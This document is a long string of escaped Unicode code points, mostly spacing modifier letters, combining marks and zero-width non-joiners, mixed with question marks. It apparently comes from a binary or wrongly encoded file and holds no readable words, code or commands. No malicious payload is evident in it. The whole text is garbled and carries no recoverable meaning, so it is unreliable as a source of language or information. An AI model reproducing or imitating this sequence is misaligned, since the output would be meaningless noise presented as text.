??\u02ff\u02ff\u02d3\u0305\u0304\u02f8\u02f8??\u02d7\u02ed??\u0307\u02d2\u02f0??\u0315\u0313??\u02f5\u02d3\u02e9\u030f\u0305\u0310\u0312\u02f1\u02d2??\u0314\u02f4\u0316\u0313\u0307\u02d2\u02d4\u02f8\u0318\u02ff\u0302\u0303\u0313\u0312\u0303\u0302\u02ef??\u02f8\u02f2\u0304\u02e9\u0317??\u0312\u02f1\u02f5\u02d4\u0301??\u030d\u02e8\u02ef\u030c\u02e6\u02eb\u0303\u02eb\u02e5\u02e7\u02ef\u02d2\u02e7\u030c????\u0302??\u02f3??\u0318\u02ea\u0310\u02d2\u02d4\u0318\u0300\u0315\u0312??????\u030c\u02f5\u02f4\u02f3\u0311??\u0308\u0300\u030c\u0306\u0300\u0300\u0302\u02ea\u02e5\u02ef\u0307\u02e6\u02e7\u02ef\u0310??\u0318\u02d5\u02e9\u02f4\u0301??\u030e\u0302\u0313\u02f4\u0317\u02ea????\u0312????\u0318\u0307\u02e8\u02e8\u0303\u02ea??\u0307\u02d6\u0302??\u0307\u0303??\u02ed??\u0311??\u02d3\u030a\u02e5\u0301\u0310??\u02e9\u0313\u02eb\u02e6??\u030f??\u0308\u030d\u030b\u0300\u02f2\u030c??\u02e6\u02ed??\u02df??\u0308??\u02df??\u02f3\u02f0\u030f??\u030a\u02ea??\u030d\u0300????\u0312\u02e6\u02ff\u0314\u02f1\u0310\u0315\u0306\u02f2\u030a??\u0303\u02f3\u02e9\u0313\u0307\u0305\u02f8??????\u02f0??\u02d4??\u02f4????\u0301??\u0312??\u02f7??\u0310\u0315\u0312\u0307\u0305\u0301\u0308\u0316????\u030a\u02e5\u0303\u02f6\u02d3??\u0303\u0318\u02df??\u02d6\u02f8\u02d2??\u030b\u02f3??\u02f6\u02e9??\u02e9\u0304\u0313\u0314??\u0306\u0314\u030f\u02f3\u02f3\u030e??\u02ef\u02d4\u0305\u02d7\u030d\u02ef\u0305\u0312\u0317\u030e\u02d7\u0310\u02ff????\u0314\u02d2??\u0313\u02e6\u0301\u0310\u0313\u02e6\u030a\u0313\u0300\u030c\u030c????\u0309\u0302\u02df??\u0308\u0302??\u02eb\u0317\u02d4\u02f6\u02f6??\u030c\u030e\u0301\u02e8\u0314\u0316\u02d2\u030b\u0306\u02ed\u02ed\u02e5????\u030a\u0309????\u02e7\u02f8\u0313??\u030e\u0303\u02e7\u0306\u0310\u02ef??\u02f0\u030d\u02f0\u02f1\u02f5\u0312\u0309??\u02f1\u02d6\u02e5\u02f2\u02d5\u0306\u0315??\u0315????\u0302????\u0301\u02f1\u02d6\u02ff\u030a????????\u0318\u02f3??\u02f4\u02f2??\u02f4\u0301\u02f7\u0307??\u02d7\u0305\u02e6????\u02d4\u030d\u02d3??\u02ef\u02f6\u02ff\u0314??\u030b\u02e7????????\u02ea\u02f8\u02e9\u02f4\u02ea??\u02f7\u02ed\u02eb\u02e8\u0314\u0305\u0309\u02f6\u0312\u0308????\u0306????\u02f0\u02eb??\u02e8??\u030e??\u0308\u0315\u02f6\u02f7\u030e\u02f3\u02e5????\u0312??????\u0302??\u02f0\u0305??\u02f8????\u0312\u0302\u02f8\u0302\u0310\u0312??\u0307\u0301\u0316\u02e5\u0316\u030c\u02f4??\u02d2\u02f2\u0307\u030e\u02d7\u02e5\u02ff\u0301\u0301\u02e7\u0302\u02f1\u02ef\u0318\u02df\u02d5\u0305\u02f8\u02e5????\u0313\u02df??\u02eb\u0303\u0312\u0307\u0315\u0307\u02f6\u0312\u02f0\u02d7\u02e9\u02ed\u0311\u02f4????\u02f5\u02e8??\u0305\u02f4\u02d6\u030e\u02f8????\u030f\u02d4\u02d4\u02d2????\u02e9????\u02eb\u02f0\u0308??\u0315\u02e7\u0308\u0318\u02f3??\u030b\u0303\u02d3????\u02e9\u02d6\u02ef\u02f1??\u02e8????\u02e9\u0307\u0316\u02f3??\u030b\u0304\u02d6\u030a??\u02f7\u0308\u02ff\u0302??\u02eb\u0303\u0304\u02f3??\u0318\u02d3\u02d2\u0314\u030b\u0306\u0313??\u030b??\u02e8??\u02e8\u0317\u02f4\u0307\u030e??\u0313\u02e8\u0304??\u02df??\u02e6\u02f1\u030b??\u02f1\u030b\u02f0\u0314\u0309\u0303\u02d6\u02f1\u02f5\u0313\u0301\u02f7\u0310\u02ff\u02d6\u02f6????\u0313\u02d7??\u0312??\u02e9\u0316??\u02f1????\u0311\u0316\u02d2??\u0317\u02ea\u02d6\u0303\u02f7\u0311\u02f2\u0318\u02d3\u030f\u02ea\u02d5\u02d6??\u02e7\u0300\u02e7????\u02d7??\u02e8\u0303\u02f8??\u0317\u0311\u02df\u02e5\u0318\u02f4??\u02d2\u02f7??\u0309\u0318\u0307\u02f0\u02df\u02e5\u030f??\u0308\u0315??\u030f\u0316\u030e\u030e??\u02d5\u02f4\u02e8\u0303\u0302??\u0300\u02f0\u02f6\u02d5??\u02e9\u030e??\u02e6??\u02f0\u02f2\u0315\u02f7\u0313??\u02f1\u02f8\u030b\u030b\u02f4????\u0305\u02e5\u030a\u02e7??\u0304\u02d2??\u02ff\u0303??\u02d4\u02e8\u02eb\u0306\u0316\u0318\u030a\u02f6\u0307\u0312\u02ff\u0309\u0304\u0305????\u0318\u02d2\u02df\u030d??\u0317??\u030b\u02e8\u02d6\u02ed??\u0305\u0308\u0316\u0310\u02f3\u02ef\u0301\u02ff\u0302\u030c\u0300\u02d4\u02d2\u02ef\u0306\u02ea??\u0312\u02df\u02ed\u02ed\u030b\u030c\u02f8\u02ff\u0306\u030b\u0314\u0314??\u0311\u02e8??\u02d6\u0309\u0310\u02f1\u02eb\u0317\u030f\u0305\u02f4??\u0318\u030b??\u030e\u02ff\u0308\u02eb\u02d7\u030b\u02ed\u0314\u0300\u0305??????\u0311\u02d4\u02ff\u0316\u02e8\u0310\u02ed\u030b\u030b\u02d4\u02e5\u030b\u02e9??\u030d\u030d\u02df\u02ed\u02d3??\u030e\u0313??\u030d\u02ef\u030b\u0311??\u02f8\u0302??\u0306\u0312\u02ed\u0312\u02ea\u02d5\u0301\u030a\u0312\u0317\u02d4??\u02d3\u02e8\u02ef\u0311\u0312\u030a??\u02eb\u02d7\u02e7????\u0313\u030d\u02f5\u0310\u0300\u030d\u02df\u0303\u0308\u0304\u02d4\u02f3??\u02d5\u02f7\u0305\u0304\u0317\u02f8??\u02e7\u030c\u02d6\u02df\u02f0\u0304\u02f0\u0301\u02e7\u030c\u02d3\u02df\u02f0??\u030e\u02e8\u02e5??\u02e7\u200c????\u02e8\u02f2\u02f1\u0309\u02e7??\u200c????\u200c??\u200c??\u200c??\u02df\u0315\u200c??\u02df????\u02eb\u0307\u02d2\u0315\u02ea\u0308\u02f3\u0315??\u0318\u02e7??\u200c??\u200c??\u200c??\u02ef\u02df\u02ff\u200c??\u200c????\u02ef\u02e5\u200c??\u02df\u0308\u0304\u0305\u200c??\u02f6\u02df\u0301\u200c??\u02ed\u02ef??\u200c??\u02df\u0308\u02f3??\u02f0\u0317\u02ff\u02f5\u02d3\u030c\u0301\u0315\u200c??\u200c????\u02df??\u02ef\u200c????\u200c??\u200c??????\u02e6\u02f4\u02f3\u030a??\u200c??\u200c??\u02f3\u02df??\u200c??\u02df\u0315??\u200c??\u02df\u0308\u02ef\u030b\u0316\u0314\u02f7\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02e7\u200c??\u02df\u030e\u02f6\u030a\u02ef\u02e7\u030d??\u02f0\u02d2\u200c??\u02df??\u02d4\u02df\u02f2\u02eb\u02df??\u0305\u200c??\u02df\u02ef\u200c??\u02df??\u200c??\u200c??\u02df\u02ea\u200c??\u200c????\u200c??\u200c????\u030d\u200c??\u200c??\u02e7\u200c??\u200c??\u02eb\u200c??\u200c??\u02df??\u200c??\u200c????\u200c??\u200c????\u200c??\u200c??\u02df\u02f3\u200c??\u200c????\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u02ef\u200c??\u200c????\u200c??\u200c????\u02ef\u200c??\u200c??\u030d\u200c??\u200c????\u200c??\u200c??\u200c??\u02df??\u200c????\u200c??\u200c??\u200c??\u02df\u02f7\u02df\u02f4\u0315\u02df\u0307\u200c??\u02f7\u02df\u02f6\u02df??\u0310\u200c??\u02f7\u02df\u030b\u0315\u02df\u0307\u200c??\u02f7\u02df\u030d\u02ef\u02df\u0307\u200c??\u02f7\u02df\u0316\u0305\u02df\u0307\u200c??\u02f7\u02df??\u02ef??\u0301\u200c??\u02f7\u02df\u02d3\u0305??\u0301\u200c??\u02f7\u02df??\u02ef\u02df\u0307\u200c??\u030d\u02df??\u0305\u02df\u02e8\u02df\u02ef\u030d\u02df\u02e6\u0315??\u02e8\u02df\u02ef\u02f7\u02df\u02ea\u0315??\u0307\u200c??\u02f7\u02df\u02f3\u0305??\u0300\u02df\u02ef\u02f7\u02df\u0304\u02ef\u02e5\u02e8\u02df\u02ef\u02d2\u02df\u030c\u02df??\u030e\u200c??\u02f7\u02df\u030d\u0305\u02e5\u02e8\u02df\u02ef\u02d2\u02df\u0310\u02df??\u030e\u200c??\u02d2\u02df\u0311\u0305??\u030e\u200c??\u02f7\u02df\u0313\u02ef\u02e5\u02e8\u02df\u02ef\u02f7\u02df\u0316\u02ef??\u0307\u200c??\u02f7\u02df??\u02df??\u0307\u200c??\u02f7\u02df??\u0305??\u02e9\u02df\u0305\u02f7\u02df\u02e5\u0315\u02e7\u0309\u02df\u0305\u02f7\u02df\u02f4\u0315\u02e7\u0309\u02df\u0305\u02f7\u02df\u0301\u02df\u02e7\u0307\u02df??\u02e7\u02df\u0302\u0305\u02e7\u02d2\u02df??\u02e7\u02df\u0308\u02ef\u02e7\u02d2\u200c??\u02f7\u02df\u030a\u0305\u02e7\u0307\u200c??\u02f7\u02df\u02d3\u02ef\u02e7\u0307\u200c??\u02f7\u02df\u02e5\u0305\u02eb\u0306\u02df\u0315\u02f7\u02df\u02f1\u02df\u02eb\u0307\u200c??\u02f7\u02df\u02f4\u0305??\u0309\u02df\u0315\u02f7\u02df\u0305\u02ef\u02eb\u0307\u200c??\u02f7\u02df\u0307\u02df??\u0300\u02df\u02ef\u02f7\u02df\u02d6\u02df??\u02d4\u02df\u0315\u02f7\u02df\u02eb\u02df\u02ef\u0307\u200c??\u02f7\u02df\u030a\u02df\u02f0\u0310\u200c??\u02f7\u02df\u0312\u02df\u02f0\u0310\u200c??\u02f7\u02df??\u0305\u02ef\u0309\u02df\u0305\u02f7\u02df\u02d4\u02ef\u02ef\u0309\u02df\u0305\u02f7\u02df??\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u02e8\u02ef\u02f3\u0309\u02df\u0305\u02f7\u02df??\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u02f4\u0315\u02f3\u0309\u02df\u0305\u02f7\u02df\u0301\u0305\u02f3\u0309\u02df\u0305\u02f7\u02df\u0308\u02ef\u02f6\u02d4\u02df\u0315\u02f7\u02df\u030d\u02ef\u02f6\u02d4\u02df\u0315\u02f7\u02df\u0310\u0315\u02f3\u0309\u02df\u0305\u02f7\u02df\u0318\u02df\u02f4\u0310\u200c??\u02df??\u200c????\u02ed\u200c??\u200c??\u200c??\u02df??\u200c????\u200c??\u02ef\u02df\u02ef\u02df\u02ea\u0311\u02df\u0315\u200c??\u02f4\u200c????\u200c??\u0305\u02df\u02ef\u02df\u02ef\u200c????\u0305\u02ea\u02f0\u02df\u02e6??\u200c??\u0315\u02df\u02e7\u200c??\u02df??\u200c????\u0314\u02df\u0312??\u02df??\u02ef\u02df??\u200c??\u0305\u02df??\u02df??\u200c????\u030d????\u02ef??\u0316\u200c??\u02f3\u02df??\u200c??\u200c??\u02ef\u200c??\u02df\u02ef\u02eb\u200c????\u02f3\u02df??\u02ef\u02df\u02e7\u200c??\u02f3??\u200c??\u02df\u02d6\u02df\u0315\u200c????\u02ef\u02df??\u200c??\u030d\u02df??\u0315??\u200c????\u02f3??\u200c????\u0316\u200c??\u0309\u02df??\u0305\u02df??\u02df\u02ef\u200c??\u02e9\u02ef\u02ef\u200c????\u02f3\u02df??\u02ef\u02df\u02f1\u200c??\u02f3??\u200c????\u02ed??\u200c??\u02df??\u02ef\u02df\u02e8\u02df??\u02ef\u200c??\u02df??\u200c????\u02df??\u200c??\u02df\u02f4\u200c??\u0309\u02df??\u0315\u02df\u02f2\u02df\u0301??\u02df\u02e6\u0315\u02df\u02f2\u02df????\u02df\u02e7\u0315\u02df\u02f2\u02df\u0304\u02f7??\u02e8\u0315??\u02f2\u02df??\u02f7??\u02e7\u0315\u02df\u0316\u02df??\u02df??\u02f5\u0305??\u0316\u02df??\u0305??\u02f5\u0305??\u0316\u200c??????\u02f5\u0305??\u02f2\u02df\u02f3\u02ef??\u02f6\u0305??\u02ef\u02e7\u200c??\u200c??\u02df??\u02f0\u02e5\u02ea\u02ef\u02df\u02e5\u0315\u02df??\u02df\u02e7\u0305\u0305\u200c??\u200c??\u02df\u02e8\u02f7\u02df\u02ef\u0315??\u0301\u200c????\u02df\u0316??\u02e7\u200c??\u200c??\u02df\u030a\u0305??\u0313\u02df\u02f7??\u200c??\u0305??\u0315\u02e8\u200c??\u200c??\u02df??\u02f0\u02df??\u02f7??\u0318\u0315\u02df??\u02df\u02ea\u02ef\u030b\u200c??\u200c??\u02df\u02e8\u02f7\u02df\u02ef\u02df\u02ea\u0316\u200c??\u02ef\u02df\u02f4??\u0301\u200c??\u200c??\u02df\u030a\u0305??\u030c\u02df\u0307\u02df????\u0305??\u0309\u02e9\u200c??\u200c??\u02df??\u02e5\u02e5??\u02eb\u02df\u02f5\u200c??\u02e8\u02df\u02ea\u02ef\u030d\u200c??\u200c??\u02df??\u02eb\u02df\u0318\u02ef\u02df??\u02df\u02ef\u0309\u02df\u02d2??\u0309\u200c??\u200c??\u02df??\u0315\u02df\u02d2\u02df??\u02eb????\u02ef??\u0305\u02e9\u0305\u200c??\u200c??\u02df\u02f2\u02df??\u02f7??\u0308\u0305??\u02e8\u200c??\u0305\u0312\u200c??\u200c??\u02df??\u02eb\u02df??\u02ef??\u0307\u02df\u02ef\u0309\u02df??????\u200c??\u200c??\u02df??\u0315????\u02df\u02eb\u02eb????\u02ef\u02df\u0309\u02ea\u0315\u200c??\u200c??\u02df\u02f2\u02df??\u02f7????\u0305??\u02e8\u02df\u02ea\u02ef\u0315\u200c??\u200c??\u02df??\u02eb\u02df??\u02df????\u02df\u02ef\u0309\u02df\u0314????\u200c??\u200c??\u02df??\u0315??\u0314\u02df\u0306\u0305????\u02ef??\u02e7\u02eb\u0305\u200c??\u200c??\u02df\u02f2\u02df??\u02d2????\u02df\u02e7\u02e8\u02df\u02e9\u0315\u0318\u200c??\u200c??\u02df\u02e8??\u02f7\u0312\u200c??\u0300\u200c??\u0309\u02df\u0314??\u02ef\u200c??\u200c??\u02df??\u0315??\u02f0\u02df??\u0311????\u02ef??\u02df??\u02ef\u200c??\u200c??\u02df\u02f2\u02df\u02eb??\u02df\u0302\u02ef\u02e7\u02e8\u02df\u02ea\u0305??\u200c??\u200c??\u02df??\u02eb\u02df\u0318\u02ef??\u02f0\u02df\u0305\u0309\u02df\u030b??\u0301\u200c??\u200c??\u02df??\u0315????\u02df\u030f\u0311????\u02ef??\u030d\u02ed\u200c??\u200c??\u200c??\u02f2\u02df??\u0305??\u0312\u02ef\u02e7\u02e8\u02df\u02eb\u02ef\u02d3\u200c??\u200c??\u02df??\u02eb\u02df\u02ed\u02df??\u02eb\u02df\u0305\u0309\u02df\u0316??\u030d\u200c??\u200c??\u02df??\u0315??\u02f0\u02df\u02ed\u02df????\u02ef??\u02df\u02ed\u0315\u200c??\u200c??\u02df\u02f2\u02df\u02eb??\u02df\u02d5\u02df\u02e7\u02e8\u02df??\u02df\u02d6\u200c??\u200c??\u02df??\u02eb\u02df\u02e8\u02ef\u02ef\u02e7\u02df\u0315\u0309\u200c??\u200c????\u02df??\u0305??\u200c??\u02df??\u02df\u02e6\u02e7??\u200c??\u02df??\u02df\u02e6\u02f7??\u200c??\u02df??\u02df??\u02ef??\u200c??\u02df??\u02df??????\u200c??\u02df??\u02df\u02ea\u02f7??\u200c??\u02df??\u02df\u02eb\u02ef??\u200c??\u02df??\u02df????????\u02ef??\u02ea\u02df??\u02eb\u02df\u02ed\u02ef??\u0318\u02df??\u02e7\u02df\u02f1\u02ef??\u0318\u02df??\u200c??\u02f5\u02ef\u02df\u02d5\u02df\u02f4\u0305\u02df\u02e5\u02ef??\u030c\u02df\u02f6\u02d6\u02df\u0303\u02ef??\u0318\u02df??\u0305\u02df\u030b\u02ef??\u02e9\u02df\u0301??\u02df\u0303\u02ef??\u0313\u02df\u0301\u0305\u02df\u030f\u02ef??\u0318\u02df\u02ed\u02f3\u02df\u030f\u02ef\u02df??\u02df\u0313\u0315\u02df\u0317\u02ef????\u02df\u0306??????\u02ef??\u0307\u02df\u0306\u0311??\u02e9\u02ef??\u0318\u02df??\u0305\u02df\u0305\u02ef\u02df??\u02df\u0318\u030d??\u0305\u02ef\u02df??\u02df\u0318\u030d??\u02d4\u02ef\u02df\u0317\u02df\u0316\u0311????\u02ef\u02e6\u0318\u02df??\u0305\u02df??\u02ef\u02e5\u02f5\u02df\u02d2\u02eb??\u02e9\u02ef??\u0302\u02df\u02d2\u030d??\u02df\u02ef\u02e5\u030b\u02df\u0318\u030d??\u0301\u02ef??\u0316\u02df\u02d5\u030d??\u0301\u02ef??\u02d4\u02df\u02d7\u030d??\u0301\u02ef??\u200c??\u02d7\u030d??\u0301\u02ef??\u02e5\u02df\u02d7\u030d??\u0303\u02ef??\u02eb\u02df??\u0301??\u0311\u02ef??\u0304\u02df\u0316\u02eb??\u0311\u02ef\u02df\u02f8????????\u02e5\u02ef??\u02d7????\u02ef??\u02f7\u02ef??????\u02e5\u02d6??\u02f7\u02ef??\u02f4??\u02e7\u0315??\u0301\u02ef??\u0304??\u02e9\u02eb??\u02eb\u02ef??\u0312??\u02eb\u02ef??\u0307\u02ef??\u0317????\u0309??\u0303\u02ef??\u02d5????\u030d??\u02df\u02ef\u02e5????\u02df\u02e7??\u02e7\u02ef\u02e6\u0318\u02df??\u02eb??\u02e9\u02ef\u02e6\u0318\u02df??\u0305\u02df\u02eb\u02ef\u02e6\u0318\u02df??\u02df??\u02ed\u02ef\u02e6\u0318\u02df??\u02df??\u02ef\u02ef\u02e6\u0318\u02df??\u02df??\u02f1\u02ef\u02e6\u0318\u02df??\u02df??\u02f3\u02ef\u02e6\u0318\u02df??\u02df??\u02f5\u02ef\u02e6\u0318\u02df??\u02df??\u02f7\u02ef\u02e6\u0318\u02df??\u02df??\u02ff\u02ef\u02e6\u0318\u02df\u02eb\u0311??\u0301\u02ef\u02e6\u0318\u02df??\u02df??\u0303\u02ef\u02e6\u0318\u02df??\u02df??\u0305\u02ef\u02e6\u0318\u02df??\u0305\u02df\u02ea\u0305??\u0310\u02df\u02f7\u02f3??\u02ea\u0305??\u0308\u02df\u02f7\u02f3??\u02ea\u0305??\u0300\u02df\u0300\u02eb??\u02ea\u0305????\u02df\u02ef\u0301??\u02ea\u0305??\u02d5\u02df\u0304\u030d??\u02ea\u0305??\u0318\u02df\u0302\u02df??\u02ea\u0305??\u02f2\u02df\u02ff\u02ef??\u02ea\u0305\u02df\u0318\u02df\u02f3\u02f3??\u02ea\u0305\u02df\u0310\u02df\u02f1????\u02ea\u0305\u02df\u0308\u02df\u02f0\u0305??\u02ea\u0305??\u02ea\u02df\u02f7\u0311??\u02ea\u0305????\u02df\u02f7\u02f3??\u02ea\u0305\u02df\u02d5\u02df\u02f5\u02ef??\u02df\u0305??\u0309??\u200c??\u200c??\u0315\u02df??\u02df??\u0305??\u200c??\u02df??\u200c????\u02df\u02f0\u0305\u200c??\u200c??\u0305\u02df\u02e8\u0315??\u0308\u02df\u02e8\u02f3\u02df??\u0305??\u02d2\u02df??\u0311??\u02f0\u0315??\u0307\u02df\u02f8\u0301??\u030f\u0315\u02e6\u02ed\u02df\u0303\u0301????\u0305\u02e7\u0304\u02df\u0308????\u02f0\u0315\u02e8\u0309\u02df\u030d????\u030b\u02df\u02ea??\u02df\u0309\u0305\u02df??\u0315??\u02d7\u02df\u02f7\u02df??\u02d7\u02df\u02e6\u0301??\u02ef\u200c??\u02df\u02ef??\u02df\u02ef\u0305\u200c??\u02df\u0315\u02df\u02f7\u02f0\u0305\u200c????\u200c????\u0305\u200c??\u200c??\u02ef\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u02df\u02f8\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u02e7\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u030d\u02df\u02e9\u02ef\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u0305\u02df\u02d2\u200c??\u200c??\u200c??\u02df\u02e6\u200c??\u02f7\u02df??\u200c??\u02e6\u200c??\u0309\u02df??\u0305\u02df\u02e9\u200c??\u0309\u200c??\u200c??\u200c??????\u02df\u0308\u02df\u02ef\u200c??\u200c??\u02df??\u0315??\u02eb??\u200c??\u200c??\u200c??\u0302\u02df\u02e7\u0315??\u02df\u02ef\u200c??\u02df????\u02df\u0309\u02df\u02ef\u200c??\u200c??\u02df\u02e8\u0315??\u02eb??\u02df??\u200c??\u200c??\u030c\u02df\u02e8\u02df??\u200c??\u200c??\u02df????\u02df\u0308\u02df\u02ef??\u200c??\u200c??\u02ea\u02ef??\u02ef??\u200c??\u200c??\u200c??\u0314\u02df\u02e7\u0315??\u200c??\u200c??\u02df????\u02df\u0308\u02df\u02ef\u200c??\u200c??\u02df\u02eb\u0315??\u02eb??\u200c??\u200c??\u200c????\u02df\u02e7\u0315??\u02df\u02ef\u200c??\u02df??\u02f3\u02df\u0309\u02df\u02ef\u0313\u02df??\u0311\u02df\u02e8\u0305????\u02df??\u02f7\u02df\u0303\u0315\u02df\u02ea\u02df\u02e7\u0309\u02df??\u02df??\u0310\u02df??\u200c??\u0311\u200c??\u0317\u02df\u02ea\u02f3\u02df\u02e6\u02df??\u02d4\u02df??\u02ef\u02df\u02d2\u200c??\u0311\u200c??\u0315??\u02df\u02ef????\u200c??\u02e7\u02df\u0305\u02ef\u02df??\u02df????\u02df??\u02df??\u02e8\u200c??\u02f3\u02df\u0305\u02ef\u02df\u02e5\u02df????\u02df??\u0315????\u200c??\u0305\u02df??\u02ef\u02df\u02e8\u02df??\u0309\u02df??\u0305????\u200c??\u0311\u02df??\u02ef\u02df\u02eb\u02df\u02e7??\u02df??\u02ef????\u200c??????\u0302\u02f5\u02d3\u030e\u02f8\u030c\u02f3\u0313\u02f4\u02f3\u0309\u0313\u02f8\u02e5\u0316\u0311\u02df??\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1\u02d3\u02f4\u02f1\u02ef??\u0312\u0301????\u0314\u0301\u030b\u0316\u030e\u02f7\u0305??\u02f2\u0303\u02f6????\u02f8\u02f5??\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u0309\u02f0\u0317\u02f7\u02f6\u0302\u030e\u0300\u030b\u0301\u02df\u02f2\u02f5\u030a\u0308\u0301\u030b\u02d7\u0318\u0300??\u02f8??\u02ea\u030a\u02f8\u030e\u0301??\u02f4\u0306\u0300??\u02e8\u0306\u0301??\u030a\u0308\u02df??\u0316??\u0300??\u02f0??\u0300\u02e5\u02f3??\u02df????\u030d\u02f7\u02f6\u02e7\u02df\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f3\u0306\u030a\u0300\u02e6??\u030a\u0301\u030c\u02eb\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02e8??\u0300\u030c\u02f0\u030e\u0300\u02f5\u02f3\u0313\u02ef??\u02d7\u0312\u0301\u02e5\u030a\u0311\u02f8\u02f6\u02e8\u02f2\u02f8\u02f6\u02e8??\u02ff\u02f5??\u030a\u0301\u0315??\u02e8\u0300\u030b\u030a??\u02ff\u02f5??\u0311\u02ff\u02f6\u030e\u030a\u02ef\u02f6\u02e8\u0317\u02f7\u02f6\u0309\u02df\u02ef\u02f6\u02e8\u0317\u02f7\u02f6\u0309\u02df\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f3\u02f8\u030e\u02f8\u02f5\u0316\u0309\u02f1\u02e5??\u0313\u02f8\u02e5\u0316\u030a\u02df??\u02d3\u0308\u02f7??\u02f0\u0314\u0301\u0305????\u02f8\u02f6\u02f0\u0306\u02df????\u0311\u0301\u02e5\u0306\u0306\u02df??\u02d7\u0307\u02ff\u030b\u02f4\u0308\u0302\u02df??\u0306\u0305\u030f??\u02df\u02d2\u02f7\u02e9\u0305\u02df??????\u0301\u030b\u02f4\u0306\u0300\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f1\u02f3\u02d6\u02df\u02f2\u02f5\u02f4\u0312\u0300??\u02e8\u02d3\u02f3??\u02f0\u0317\u02f8\u02f5??\u0312\u02df??\u02d3\u0308\u0302\u02e5\u02d7\u0317\u02df??\u02e8\u02d3\u0302\u02e5\u02f3\u02df\u02f0??\u030e\u030e\u0301??????\u0301\u030b\u02f4\u0306\u0300\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f1\u02f3\u02d6\u0313\u02ef??\u02d7\u0312\u0301\u02e6\u02e8\u030a\u0301????\u030e\u0300??\u02d2\u02df\u02ef??\u02d7\u0312\u0301\u02e6\u02e8\u030a\u0301????\u030e\u0300??\u02d3??\u0300??\u02f0\u030a\u02df??\u030a??\u02ff\u02f6??\u0315\u0300????\u0306\u02f7\u030b\u0316\u030a\u02df??\u02f0\u030e\u0301????\u0314\u0301??\u02f3\u02df\u02f0\u02e6\u02e8\u0306\u0302\u0315??\u030a\u030e\u02e9\u0304\u030b\u0312\u0300\u0304\u0308\u0305\u030e\u02e7\u02df\u02f0\u02f5\u02d3\u0308\u0300??\u02f0\u030e\u0300\u030b\u0301\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02f0\u030a\u0303\u02e6\u02ef\u02df\u02f3\u030b\u02f4\u0318\u02ff\u02f6\u030e\u030a\u02df????\u030a\u0300\u0305??\u0308\u0305\u030d\u0311\u02df\u02d4\u0300\u0303\u02d3\u02d2\u02d2\u02e5\u0314\u02df??\u030a??\u0300\u030c\u02f4\u0312\u02f8\u02f6\u02e8\u0306\u02f7\u030b\u0316\u030a\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3??\u0300??\u0316\u0311\u02f8\u02f5????\u02ff\u02f5\u02d7\u0313\u0301\u0315????\u0300??\u0316\u0314\u0301\u0305????\u0301\u030c\u02e8\u0306\u0303\u02f3\u0316\u030e\u0301??\u02ef\u02df\u02f1\u02f5??\u0306\u02f8??\u02f3\u02df\u02ef\u030b\u030a??\u0300\u02f5??\u0315\u02df??\u030a??\u0300??\u0316\u0311\u02f8\u02f5????\u02ff\u02f5\u02d7\u0313\u02df??\u02f0\u02d3\u0301\u02e5\u02f3\u02df\u02f0??\u02f4??\u02f4\u02e6\u030a\u0315\u02f8\u02f3\u02f8\u0317\u0300????\u02e7\u02f7\u02f5\u02d3\u0309\u0300\u02e5\u02f3\u02df\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f4\u02f0\u02d3\u0301\u02e5\u02f4\u02e7\u02f7\u02f5\u02d3\u0309\u0300\u02e5\u02f3\u02df\u02f4\u02e5\u02d7??\u0301\u030c\u02e8\u0306\u0303\u02ef??\u0306\u0305\u030f\u02ef\u02df\u02f3\u030b\u02f4\u0318\u0300??\u02f4\u0317\u02f7??\u02f4??\u02f7\u02f5\u02d3\u0306\u02f8??\u02f4\u0317\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3\u02f1\u02f8\u02f6??\u0314\u0302\u02f6\u02e8\u0308\u02f8\u02f6\u02eb\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u0309\u02df\u02f3??\u030a\u0318\u0302\u02e5\u02f4\u0312\u02ea\u030a\u02e8\u030a\u02f8\u030b\u0316\u030a\u02f7??\u02f0\u030e\u0300??\u02d2\u02df\u02f0??\u02f4??\u02f2??\u02e8\u030f\u02f8\u02f5????\u02df??\u02d5??\u0312\u02df??\u0317\u02f8\u02f6??\u0304\u0300\u030b??\u0312\u02f8\u02ef??\u0315\u0301\u030b\u02d7\u030f\u02f6??\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02f1\u02f3????\u0301??\u02f0\u0314\u0300\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02f4??\u0317\u0300??\u02f8\u030e\u02f8\u02e5\u02f4\u0317\u02df??\u030a\u0313\u0302??\u02eb\u0317\u02df??\u030a\u0313\u0302\u02e5\u02f4\u0317\u02f7\u02f5????\u02ff\u02f5\u02d7\u0313\u02df????\u0306\u0300\u02e5\u0316??\u0303\u02f3\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02ef????\u0311\u0300??\u02f0\u02d3\u0301\u02e5\u02f3\u02df\u02f0\u02f5\u02d3??\u02ff\u02f6\u02e8\u0314\u0300\u030b??\u030a\u0300\u030c\u02ef\u02df\u02f0\u02f6\u0306\u030e\u0302\u02df????\u0302\u02f5\u02d3\u030e\u02f